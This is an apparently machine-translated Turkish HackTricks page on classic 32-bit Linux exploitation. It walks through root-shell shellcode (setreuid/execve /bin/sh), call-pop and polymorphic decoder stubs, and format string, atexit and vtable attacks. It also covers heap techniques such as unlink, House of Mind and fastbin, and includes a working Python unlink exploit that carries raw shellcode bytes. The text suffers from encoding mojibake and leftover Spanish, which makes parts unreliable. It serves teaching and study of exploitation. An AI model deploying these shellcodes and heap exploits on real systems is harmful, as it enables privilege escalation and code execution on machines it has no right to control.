# Linux Exploiting (Temel) (SPA)

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan ileri seviyeye Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'da **takip edin**.
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## **2.SHELLCODE**

Kernel kesmelerini gÃ¶rÃ¼ntÃ¼le: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep â€œ\_\_NR\_â€

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(â€œ/bin/shâ€, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; eax'Ä± temizle\
xor ebx, ebx ; ebx = 0 Ã§Ã¼nkÃ¼ geÃ§irilecek bir argÃ¼man yok\
mov al, 0x01 ; eax = 1 â€”> \_\_NR\_exit 1\
int 0x80 ; Sistem Ã§aÄŸrÄ±sÄ±nÄ± yÃ¼rÃ¼t

**nasm -f elf assembly.asm** â€”> Bir .o dosyasÄ± dÃ¶ndÃ¼rÃ¼r\
**ld assembly.o -o shellcodeout** â€”> DerlenmiÅŸ kod iÃ§eren yÃ¼rÃ¼tÃ¼lebilir bir dosya verir ve **objdump** ile opcode'larÄ± Ã§Ä±karabiliriz\
**objdump -d -Mintel ./shellcodeout** â€”> GerÃ§ekten shellcodemuz olduÄŸunu ve opcode'larÄ± Ã§Ä±karmak iÃ§in

**Shellcodenin Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± kontrol etmek**
```
char shellcode[] = â€œ\x31\xc0\x31\xdb\xb0\x01\xcd\x80â€

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
Sistem Ã§aÄŸrÄ±larÄ±nÄ±n doÄŸru yapÄ±ldÄ±ÄŸÄ±nÄ± gÃ¶rmek iÃ§in Ã¶nceki program derlenmeli ve sistem Ã§aÄŸrÄ±larÄ± **strace ./DERLENMÄ°Å_PROGRAM** iÃ§inde gÃ¶rÃ¼nmelidir.

Shellcode'lar oluÅŸturulurken bir hile yapÄ±labilir. Ä°lk talimat bir Ã§aÄŸrÄ±ya bir sÄ±Ã§rama yapmaktÄ±r. Ã‡aÄŸrÄ±, orijinal kodu Ã§aÄŸÄ±rÄ±r ve aynÄ± zamanda EIP'yi yÄ±ÄŸÄ±na yerleÅŸtirir. Ã‡aÄŸrÄ± talimatÄ±ndan sonra ihtiyacÄ±mÄ±z olan dizeyi eklemiÅŸizdir, bu nedenle bu EIP ile dizeyi iÅŸaretleyebilir ve aynÄ± zamanda kodu devam ettirebiliriz.

Ã–RNEK **HÄ°LE (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al Ãºltimo call
popl                %esi                                       ; Guardamos en ese la direcciÃ³n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=â€œ/bin/shâ€
leal                 0x8(%esi), %ecx      ; arg[2] = {â€œ/bin/shâ€, â€œ0â€}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(â€œ/bin/shâ€, [â€œ/bin/shâ€, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruciÃ³n
.string             \â€/bin/sh\â€                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
**Stack Kullanarak EJ(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; â€œ\0â€
push               dword 0x68732f2f ; â€œ//shâ€
push               dword 0x6e69622f; â€œ/binâ€
mov                ebx, esp                     ; arg1 = â€œ/bin//sh\0â€
push               eax                             ; Null -> args[1]
push               ebx                             ; â€œ/bin/sh\0â€ -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(â€œ/bin/shâ€, args[â€œ/bin/shâ€, â€œNULLâ€], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutÃ³ fabs
â€¦
```
**Yumurta AvcÄ±sÄ±:**

Bir iÅŸleme iliÅŸkilendirilmiÅŸ bellek sayfalarÄ±nÄ± dolaÅŸarak orada saklanan shellcode'u arayan kÃ¼Ã§Ã¼k bir kod parÃ§asÄ±dÄ±r (shellcode'da yer alan bir imza arar). Kod enjekte etmek iÃ§in sadece kÃ¼Ã§Ã¼k bir alanÄ±n olduÄŸu durumlarda faydalÄ±dÄ±r.

**Polimorfik Shellcode'lar**

ÅifrelenmiÅŸ kabuklardan oluÅŸan ve onlarÄ± Ã§Ã¶zen ve onlara atlayan kÃ¼Ã§Ã¼k kod parÃ§alarÄ±na sahip kabuklardÄ±r, Call-Pop hilesini kullanarak ÅŸifrelenmiÅŸ bir Ã¶rnek ÅŸÃ¶yle olabilir:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerÃ¡)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;AquÃ­ va el shellcode
```
## **5. Ek YÃ¶ntemler**





**Murat TekniÄŸi**

Linux'ta tÃ¼m programlar 0xbfffffff'den baÅŸlayarak haritalanÄ±r.

Yeni bir iÅŸlem iÃ§in yÄ±ÄŸÄ±nÄ±n nasÄ±l oluÅŸturulduÄŸunu gÃ¶z Ã¶nÃ¼nde bulundurarak, bir programÄ±n yalnÄ±zca shellcode'un bulunduÄŸu bir ortamda baÅŸlatÄ±lmasÄ±nÄ± saÄŸlayacak ÅŸekilde bir exploit geliÅŸtirilebilir. Bu adres ÅŸu ÅŸekilde hesaplanabilir: addr = 0xbfffffff - 4 - strlen(NOMBRE\_ejecutable\_completo) - strlen(shellcode)

Bu ÅŸekilde, shellcode'un bulunduÄŸu ortam deÄŸiÅŸkeninin adresi kolayca elde edilebilir.

Bu, execle fonksiyonunun yalnÄ±zca istenilen ortam deÄŸiÅŸkenlerine sahip bir ortam oluÅŸturmasÄ±na izin vermesi sayesinde mÃ¼mkÃ¼ndÃ¼r.



##

###

###

###

###

### **Format Strings to Buffer Overflows**

**sprintf**, biÃ§imlendirilmiÅŸ bir dizeyi bir deÄŸiÅŸkene taÅŸÄ±r. Bu nedenle, bir dizenin biÃ§imlendirmesini kÃ¶tÃ¼ye kullanarak, iÃ§eriÄŸin kopyalandÄ±ÄŸÄ± deÄŸiÅŸkende bir tampon taÅŸmasÄ±na neden olabilirsiniz.\
Ã–rneÄŸin, yÃ¼k `%.44xAAAA`, deÄŸiÅŸkene 44B+"AAAA" yazacak ve bu bir tampon taÅŸmasÄ±na neden olabilir.

### **\_\_atexit YapÄ±larÄ±**

{% hint style="danger" %}
GÃ¼nÃ¼mÃ¼zde bunu sÃ¶mÃ¼rmek Ã§ok **garip**.
{% endhint %}

**`atexit()`**, diÄŸer fonksiyonlarÄ±n parametre olarak iletilen bir iÅŸlevdir. Bu iÅŸlevler, bir `exit()` veya ana iÅŸlevin dÃ¶nÃ¼ÅŸÃ¼ sÄ±rasÄ±nda yÃ¼rÃ¼tÃ¼lecektir.\
Ã–rneÄŸin, bu iÅŸlevlerden herhangi birÄ±nÄ±n adresini Ã¶rneÄŸin bir shellcode'a iÅŸaret etmek iÃ§in deÄŸiÅŸtirebilirseniz, iÅŸlemi kontrol edersiniz, ancak bu ÅŸu anda daha karmaÅŸÄ±ktÄ±r.\
Åu anda yÃ¼rÃ¼tÃ¼lecek iÅŸlevlerin adresleri birkaÃ§ yapÄ± arkasÄ±nda gizlenmiÅŸtir ve sonunda iÅŸaret ettiÄŸi adresler iÅŸlevlerin adresleri deÄŸildir, ancak XOR ve rastgele bir anahtarla ÅŸifrelenmiÅŸtir. Bu nedenle, bu saldÄ±rÄ± vektÃ¶rÃ¼ ÅŸu anda x86 ve x64\_86'da en azÄ±ndan Ã§ok kullanÄ±ÅŸlÄ± deÄŸildir.\
Åifreleme iÅŸlevi `PTR_MANGLE`'dÄ±r. m68k, mips32, mips64, aarch64, arm, hppa gibi **diÄŸer mimariler**, girdi olarak aldÄ±ÄŸÄ± gibi dÃ¶ndÃ¼rdÃ¼ÄŸÃ¼ iÃ§in ÅŸifreleme iÅŸlevini uygulamaz. Bu nedenle, bu mimariler bu vektÃ¶r tarafÄ±ndan saldÄ±rÄ±ya uÄŸrayabilir.

### **setjmp() & longjmp()**

{% hint style="danger" %}
GÃ¼nÃ¼mÃ¼zde bunu sÃ¶mÃ¼rmek Ã§ok **garip**.
{% endhint %}

**`Setjmp()`**, baÄŸlamÄ± (kaydedilen kayÄ±tlarÄ±) **kaydetmeye** izin verir.\
**`longjmp()`**, baÄŸlamÄ± **geri yÃ¼klemeye** izin verir.\
Kaydedilen kayÄ±tlar: `EBX, ESI, EDI, ESP, EIP, EBP`'dir.\
Ancak EIP ve ESP, **`PTR_MANGLE`** iÅŸlevinden geÃ§irilir, bu nedenle bu saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z mimariler yukarÄ±dakiyle aynÄ±dÄ±r.\
Hata kurtarma veya kesmeler iÃ§in kullanÄ±ÅŸlÄ±dÄ±r.\
Ancak, okuduÄŸum kadarÄ±yla, diÄŸer kayÄ±tlar korunmamaktadÄ±r, bu nedenle Ã§aÄŸrÄ±lan iÅŸlev iÃ§inde `call ebx`, `call esi` veya `call edi` varsa, kontrol ele geÃ§irilebilir. Veya EBP deÄŸiÅŸtirilerek ESP deÄŸiÅŸtirilebilir.

**VTable ve VPTR in C++**

Her sÄ±nÄ±fÄ±n bir **Vtable**'Ä± vardÄ±r, bu bir yÃ¶ntemler dizisidir.

Her bir **sÄ±nÄ±f** nesnesinin bir **VPtr**'si vardÄ±r, bu sÄ±nÄ±fÄ±nÄ±n dizisinin bir **iÅŸaretÃ§isidir**. VPtr, her nesnenin baÅŸlÄ±ÄŸÄ±nÄ±n bir parÃ§asÄ±dÄ±r, bu nedenle **VPtr'nin Ã¼zerine yazÄ±lmasÄ±** baÅŸarÄ±lÄ±rsa, bir iÅŸlevi yÃ¼rÃ¼tmek iÃ§in sahte bir yÃ¶nteme iÅŸaret edecek ÅŸekilde deÄŸiÅŸtirilebilir.

## **Ã–nleyici ve KaÃ§Ä±nma Ã–nlemleri**

###

**Libsafe'in DeÄŸiÅŸtirilmesi**

Åu ÅŸekilde etkinleÅŸtirilir: LD\_PRELOAD=/lib/libsafe.so.2\
veya\
â€œ/lib/libsave.so.2â€ > /etc/ld.so.preload

BazÄ± gÃ¼vensiz iÅŸlev Ã§aÄŸrÄ±larÄ±nÄ± gÃ¼venli iÅŸlevlerle deÄŸiÅŸtirir. StandartlaÅŸtÄ±rÄ±lmamÄ±ÅŸtÄ±r. (yalnÄ±zca x86 iÃ§in, -fomit-frame-pointer ile derlenmemiÅŸ, statik derlemeler iÃ§in geÃ§erli deÄŸil ve LD\_PRELOAD setuid olan ikili dosyalarda Ã§alÄ±ÅŸmaz).

**ASCII Armored Adres AlanÄ±**

PaylaÅŸÄ±lan kÃ¼tÃ¼phaneleri 0x00000000 ile 0x00ffffff arasÄ±nda yÃ¼klemek anlamÄ±na gelir, bÃ¶ylece her zaman bir 0x00 baytÄ± olur. Bununla birlikte, bu neredeyse hiÃ§bir saldÄ±rÄ±yÄ± durdurmayacak ve Ã¶zellikle little endian'da etkisiz olacaktÄ±r.

**ret2plt**

Bu, strcpy@plt iÅŸlevini (plt'den) Ã§aÄŸÄ±ran bir ROP gerÃ§ekleÅŸtirmeyi ve GOT girdisinin adresine iÅŸaret ederek Ã§aÄŸrÄ±lmak istenen iÅŸlevin ilk bayraÄŸÄ±nÄ± (system()) kopyalamayÄ± iÃ§erir. ArdÄ±ndan aynÄ±sÄ±nÄ± GOT+1'e iÅŸaret ederek system() iÅŸlevinin 2. bayraÄŸÄ±nÄ± kopyalarsÄ±nÄ±z... Sonunda GOT'da saklanan adrese Ã§aÄŸrÄ±lÄ±r, bu adres system() olacaktÄ±r.

**chroot() ile Kafesler**

debootstrap -arch=i386 hardy /home/user â€”> Belirli bir alt dizin altÄ±na temel bir sistem yÃ¼kler

Bir yÃ¶netici, bu kafeslerden birinden Ã§Ä±kmak iÃ§in ÅŸunu yapabilir: mkdir foo; chroot foo; cd ..

**Kod EnstrÃ¼mantasyonu**

Valgrind â€”> HatalarÄ± arar\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap TaÅŸmalarÄ±: Temel SÃ¶mÃ¼rÃ¼ler**

**Tahsis Edilen ParÃ§a**

prev\_size |\
size | â€”BaÅŸlÄ±k\
\*mem | Veriler

**BoÅŸ ParÃ§a**

prev\_size |\
size |\
\*fd | Ä°leri parÃ§a iÅŸaretÃ§isi\
\*bk | Geri parÃ§a iÅŸaretÃ§isi â€”BaÅŸlÄ±k\
\*mem | Veriler

BoÅŸ parÃ§alar, Ã§ift yÃ¶nlÃ¼ bir liste (bin) iÃ§inde bulunur ve iki boÅŸ parÃ§a yan yana olamaz (birleÅŸtirilirler)

"size" iÃ§inde, Ã¶nceki parÃ§anÄ±n kullanÄ±mda olup olmadÄ±ÄŸÄ±nÄ±, parÃ§anÄ±n mmap() ile tahsis edilip edilmediÄŸini ve parÃ§anÄ±n ana arenaya ait olup olmadÄ±ÄŸÄ±nÄ± belirten bitler bulunmaktadÄ±r.

Bir parÃ§a serbest bÄ±rakÄ±ldÄ±ÄŸÄ±nda, bitiÅŸik parÃ§alardan herhangi biri boÅŸsa, bunlar unlink() makrosu aracÄ±lÄ±ÄŸÄ±yla birleÅŸtirilir ve yeni, daha bÃ¼yÃ¼k parÃ§a uygun bin iÃ§ine yerleÅŸtirilir.

unlink(){\
BK = P->bk; â€”> Yeni parÃ§anÄ±n BK'si, Ã¶nceki boÅŸ parÃ§anÄ±n BK'si olur\
FD = P->fd; â€”> Yeni parÃ§anÄ±n FD'si, Ã¶nceki boÅŸ parÃ§anÄ±n FD'si olur\
FD->bk = BK; â€”> Sonraki parÃ§anÄ±n BK'si yeni parÃ§aya iÅŸaret eder\
BK->fd = FD; â€”> Ã–nceki parÃ§anÄ±n FD'si yeni parÃ§aya iÅŸaret eder\
}

Bu nedenle, P->bk'yi bir shellcode'un adresiyle ve P->fd'yi GOT veya DTORS'taki bir giriÅŸin adresiyle deÄŸiÅŸtirmeyi baÅŸarÄ±rsak:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

Ve bÃ¶ylece programdan Ã§Ä±karken shellcode yÃ¼rÃ¼tÃ¼lÃ¼r.

AyrÄ±ca, unlink()'in 4. ifadesi bir ÅŸey yazÄ±yor ve shellcode bunun iÃ§in dÃ¼zeltilmelidir:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) â€”> Bu, shellcode'un 8. baytÄ±ndan itibaren 4 bayt yazÄ±lmasÄ±na neden olur, bu nedenle shellcode'un ilk talimatÄ± bunu atlamak ve shellcode'un geri kalanÄ±na gitmek iÃ§in bir jmp olmalÄ±dÄ±r.

Bu nedenle, sÃ¶mÃ¼rÃ¼ ÅŸu ÅŸekilde oluÅŸturulur:

Buffer1'e, nops'a dÃ¼ÅŸecek bir jmp ile baÅŸlayan shellcode eklenir.

Shellcode'un sonrasÄ±na, bir sonraki parÃ§anÄ±n prev\_size ve size alanÄ±na ulaÅŸana kadar doldurma eklenir. Bu alanlara 0xfffffff0 (Ã¶nceki parÃ§anÄ±n serbest olduÄŸunu belirten bitin Ã¼zerine yazÄ±lacak ÅŸekilde) ve "-4" (0xfffffffc) eklenir (2. parÃ§anÄ±n aslÄ±nda serbest olduÄŸunu belirten deÄŸiÅŸtirilmiÅŸ prev\_size'Ä± kontrol edeceÄŸi iÃ§in size alanÄ±na) -> Bu ÅŸekilde, free() araÅŸtÄ±rÄ±rken 3. parÃ§anÄ±n boyutuna gidecek ancak aslÄ±nda 2. parÃ§anÄ±n - 4'e gidecek ve 2. parÃ§anÄ±n serbest olduÄŸunu dÃ¼ÅŸÃ¼necek. Ve sonra **unlink()** Ã§aÄŸrÄ±lacak.
unlink() Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda, P->fd olarak 2. parÃ§anÄ±n ilk verileri kullanÄ±lacak, bu nedenle Ã¼zerine yazÄ±lacak adres - 12 olacak (Ã§Ã¼nkÃ¼ FD->bk'ye FD'de saklanan adrese 12 ekleyecek). Ve bu adrese, 2. parÃ§ada bulunan ikinci adresi ekleyecek, bu adresin shellcode'un adresi (sahte P->bk) olmasÄ±nÄ± isteyeceÄŸiz.

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<Iâ€, 0xfffffff0) #Ã–nceki parÃ§anÄ±n boÅŸ olduÄŸunu gÃ¶steren bitin 1 olmasÄ± Ã¶nemli**

**fake\_size = pack("\<Iâ€, 0xfffffffc) #-4, 3. parÃ§anÄ±n "size" deÄŸerinin 4 byte geride olduÄŸunu dÃ¼ÅŸÃ¼nmesi iÃ§in (prev\_size'ye iÅŸaret eder)**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Payload'da baÅŸlangÄ±Ã§ta 8 byte dolgu olacak**

**got\_free = pack("\<I", 0x08048300 - 12) #free() adresi plt-12 (free Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda shellcode'un ikinci kez Ã§alÄ±ÅŸtÄ±rÄ±lacaÄŸÄ± adresi Ã¼zerine yazmak iÃ§in)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #Payload'Ä±n baÅŸlangÄ±cÄ±nda 8 byte dolgu olacak**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #2. parÃ§a deÄŸiÅŸtiriliyor, got\_free, addr\_sc adresini saklayacaÄŸÄ± yere iÅŸaret ediyor + 12**

**os.system("./8.3.o " + payload)**

**unset() ters sÄ±rayla serbest bÄ±rakma (wargame)**

3 ardÄ±ÅŸÄ±k parÃ§ayÄ± kontrol ediyoruz ve serbest bÄ±rakma sÄ±rasÄ± tersine.

Bu durumda:

ParÃ§a c'ye shellcode yerleÅŸtirilir

ParÃ§a a'yÄ±, b'yi Ã¼zerine yazmak iÃ§in kullanÄ±rÄ±z, bÃ¶ylece size alanÄ±nÄ±n PREV\_INUSE bitinin devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ±na inanÄ±r ve parÃ§a a'nÄ±n boÅŸ olduÄŸunu dÃ¼ÅŸÃ¼nÃ¼r.

AyrÄ±ca, b'nin baÅŸlÄ±ÄŸÄ±nÄ± -4 olarak ayarlarÄ±z.

Bu durumda, program "a"nÄ±n boÅŸ olduÄŸunu ve bir depoda olduÄŸunu dÃ¼ÅŸÃ¼nerek unlink() Ã§aÄŸÄ±rÄ±r. Ancak, Ã§Ã¼nkÃ¼ baÅŸlÄ±k PREV\_SIZE -4'e eÅŸittir. Program, "a" parÃ§asÄ±nÄ±n aslÄ±nda b+4'te baÅŸladÄ±ÄŸÄ±nÄ± dÃ¼ÅŸÃ¼necektir. Yani, b+4'te "fd" iÅŸaretÃ§isi olacak ve b+16'da "bk" iÅŸaretÃ§isi olacak.

Bu ÅŸekilde, bk'ye shellcode'un adresini ve fd'ye "puts()" fonksiyonunun adresini -12 olarak yerleÅŸtirirsek, payload'umuzu elde ederiz.

**Frontlink TekniÄŸi**

Bir ÅŸey serbest bÄ±rakÄ±ldÄ±ÄŸÄ±nda ve yanÄ±ndaki parÃ§alar boÅŸ deÄŸilse, unlink() Ã§aÄŸrÄ±lmaz, doÄŸrudan frontlink() Ã§aÄŸrÄ±lÄ±r.

SaldÄ±rÄ±lan malloc hiÃ§bir zaman serbest bÄ±rakÄ±lmazsa yararlÄ± bir zayÄ±flÄ±ktÄ±r.

Gereksinimler:

Veri giriÅŸi iÅŸleviyle taÅŸÄ±nabilir bir tampon

Bu tampona bitiÅŸik olan ve serbest bÄ±rakÄ±lacak olan ve baÅŸlÄ±k fd alanÄ± taÅŸÄ±nan bir tampon

512'den bÃ¼yÃ¼k ancak Ã¶nceki tampona gÃ¶re daha kÃ¼Ã§Ã¼k bir boyutta serbest bÄ±rakÄ±lacak bir tampon

Bu adÄ±mdan Ã¶nce tanÄ±mlanan bir tampon, bu tamponun prev\_size'Ä±nÄ± Ã¼zerine yazmaya izin verir

Bu ÅŸekilde, kontrolsÃ¼z iki malloc Ã¼zerine yazarak ve yalnÄ±zca bir tanesinin serbest bÄ±rakÄ±lmasÄ±nÄ± saÄŸlayarak bir saldÄ±rÄ± gerÃ§ekleÅŸtirebiliriz.

**Ã‡ift free() ZayÄ±flÄ±ÄŸÄ±**

AynÄ± iÅŸaretÃ§iyle iki kez free() Ã§aÄŸrÄ±lÄ±rsa, aynÄ± adrese iÅŸaret eden iki bin oluÅŸur.

Birini tekrar kullanmak istendiÄŸinde sorunsuzca atanÄ±r. DiÄŸerini kullanmak istendiÄŸinde, aynÄ± alan atanÄ±r, bu da Ã¶nceki rezervasyonun yazacaÄŸÄ± verilerle yanÄ±ltÄ±cÄ± "fd" ve "bk" iÅŸaretÃ§ilerine sahip olmamÄ±za neden olur.

**free() SonrasÄ±**

Ã–nceden serbest bÄ±rakÄ±lan bir iÅŸaretÃ§i kontrolsÃ¼z bir ÅŸekilde tekrar kullanÄ±lÄ±r.

## **8 Heap TaÅŸmalarÄ±: GeliÅŸmiÅŸ SaldÄ±rÄ±lar**

Unlink() ve FrontLink() teknikleri, unlink() iÅŸlevi deÄŸiÅŸtirilerek kaldÄ±rÄ±ldÄ±.

**The house of mind**

Kodun keyfi olarak yÃ¼rÃ¼tÃ¼lmesini saÄŸlamak iÃ§in yalnÄ±zca bir free() Ã§aÄŸrÄ±sÄ± gereklidir. Ã–nce bir parÃ§ayÄ± taÅŸÄ±mak ve serbest bÄ±rakmak iÃ§in bir sonraki parÃ§ayÄ± aramak Ã¶nemlidir.

Bir free() Ã§aÄŸrÄ±sÄ±, public\_fREe(mem) iÅŸlevini Ã§aÄŸÄ±rÄ±r, bu iÅŸlev:

mstate ar\_ptr;

mchunkptr p;

â€¦

p = mem2chunk(mes); â€”> Bir parÃ§anÄ±n baÅŸladÄ±ÄŸÄ± adresi (mem-8) dÃ¶ndÃ¼rÃ¼r

â€¦

ar\_ptr = arena\_for\_chunk(p); â€”> chunk\_non\_main_arena(ptr)?heap_for_ptr(ptr)->ar_ptr:\&main_arena \[1]

â€¦

_int_free(ar_ptr, mem);

}

\[1] kÄ±smÄ±nda, NON_MAIN_ARENA bitini kontrol eder, bu biti deÄŸiÅŸtirerek true dÃ¶ndÃ¼rÃ¼p heap_for_ptr() iÅŸlevini Ã§alÄ±ÅŸtÄ±rabiliriz. Bu iÅŸlev, "mem" Ã¼zerinde bir and iÅŸlemi yaparak en az anlamlÄ± 2.5 byte'Ä± sÄ±fÄ±rlar (Ã¶rneÄŸin 0x0804a000 iÃ§in 0x08000000 yapar) ve 0x08000000->ar_ptr adresine eriÅŸir (struct heap_info gibi).

Bu ÅŸekilde, Ã¶rneÄŸin 0x0804a000 adresinde bir parÃ§ayÄ± kontrol edebilir ve **0x081002a0** adresinde bir parÃ§anÄ±n serbest bÄ±rakÄ±lacaÄŸÄ±nÄ± varsayarsak, 0x08100000 adresine ulaÅŸabilir ve istediÄŸimiz ÅŸeyi yazabiliriz, Ã¶rneÄŸin **0x0804a000**. Bu ikinci parÃ§a serbest bÄ±rakÄ±ldÄ±ÄŸÄ±nda, heap_for_ptr(ptr)->ar_ptr'Ä±n 0x08100000 adresine yazdÄ±ÄŸÄ±mÄ±zÄ± gÃ¶recektir (Ã§Ã¼nkÃ¼ Ã¶nceki and iÅŸlemi uygulanÄ±r ve buradan ilk 4 byte'Ä±n deÄŸeri, ar_ptr'yi alÄ±r).

BÃ¶ylece, \_int\_free(ar_ptr, mem) Ã§aÄŸrÄ±lÄ±r, yani **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void_t\* mem){**\
â€¦\
bck = unsorted_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Daha Ã¶nce av deÄŸerini kontrol edebileceÄŸimizi gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, av'ye yazdÄ±ÄŸÄ±mÄ±z deÄŸeri kontrol edebiliriz.

Unsorted_chunks'Ä± tanÄ±mladÄ±ÄŸÄ±mÄ±z gibi biliyoruz ki:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Bu nedenle, av->bins\[2] adresine \_\_DTOR\_END\_\_-12 deÄŸerini yazarsak, son talimatta \_\_DTOR\_END\_\_ adresine ikinci parÃ§anÄ±n adresi yazÄ±lacaktÄ±r.

Yani, ilk parÃ§anÄ±n baÅŸÄ±na \_\_DTOR\_END\_\_-12 adresini birÃ§ok kez yazmamÄ±z gerekmektedir, Ã§Ã¼nkÃ¼ av->bins\[2] buradan alÄ±nacaktÄ±r.

Ä°kinci parÃ§anÄ±n adresinin dÃ¼ÅŸeceÄŸi adrese, ilk parÃ§anÄ±n baÅŸlangÄ±Ã§ adresini yazmalÄ±yÄ±z, bÃ¶ylece heap_for_ptr() ilk parÃ§anÄ±n baÅŸÄ±nda ar_ptr olduÄŸunu dÃ¼ÅŸÃ¼nÃ¼r ve oradan av->bins\[2]'yi alÄ±r.
Ä°kinci parÃ§ada, birinci parÃ§adan yararlanarak prev\_size'a bir jump 0x0c ve size'a -> NON\_MAIN\_ARENA'yÄ± etkinleÅŸtirmek iÃ§in bir ÅŸey yazÄ±yoruz.

Sonra parÃ§a 2'de Ã§ok sayÄ±da nop ve nihayetinde shellcode'u ekliyoruz.

Bu ÅŸekilde \_int\_free(TROZO1, TROZO2) Ã§aÄŸrÄ±lacak ve \_\_DTOR\_END\_\_ adresine TROZO2'nin prev\_size adresi yazÄ±lacak ve shellcode'a atlayacak.

Bu tekniÄŸi uygulamak iÃ§in payload'u biraz daha karmaÅŸÄ±k hale getiren bazÄ± gereksinimlerin karÅŸÄ±lanmasÄ± gerekmektedir.

Bu teknik artÄ±k uygulanabilir deÄŸil Ã§Ã¼nkÃ¼ unlink iÃ§in neredeyse aynÄ± yama uygulandÄ±. Yeni hedefin, ona iÅŸaret eden yeni konumla karÅŸÄ±laÅŸtÄ±rÄ±lÄ±r.

**Fastbin**

The house of mind'in bir varyantÄ±dÄ±r.

Ä°lk \_int\_free() fonksiyonunun ilk kontrolÃ¼nden sonra aÅŸaÄŸÄ±daki kodu Ã§alÄ±ÅŸtÄ±rmak istiyoruz:

fb = &(av->fastbins\[fastbin\_index(size)] â€”> fastbin\_index(sz) â€”> (sz >> 3) - 2

â€¦

p->fd = \*fb

\*fb = p

BÃ¶ylece "fb" adresi GOT'ta bir fonksiyonun adresini gÃ¶steriyorsa, bu adrese Ã¼zerine yazÄ±lacak olan sahte parÃ§anÄ±n adresi konulur. Bunun iÃ§in arena'nÄ±n dtors adreslerine yakÄ±n olmasÄ± gerekir. Daha doÄŸrusu av->max\_fast'in Ã¼zerine yazÄ±lacak adresin yakÄ±nÄ±nda olmasÄ± gerekir.

The House of Mind ile kontrol ettiÄŸimiz gibi, av'nin konumunu kontrol ettiÄŸimizi gÃ¶rdÃ¼k.

